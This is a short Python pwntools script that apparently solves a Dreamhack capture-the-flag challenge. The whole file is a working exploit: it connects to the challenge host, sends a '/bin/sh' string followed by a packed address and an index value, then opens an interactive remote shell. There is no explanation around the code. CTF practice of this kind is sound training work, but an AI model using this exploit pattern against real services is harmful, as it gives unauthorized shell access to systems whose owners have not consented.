from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14679
r = remote(HOST, PORT)

sh=0x804a0ac

r.sendlineafter(b': ', b'/bin/sh\x00' + p32(sh))
r.sendlineafter(b': ', b'21')

r.interactive()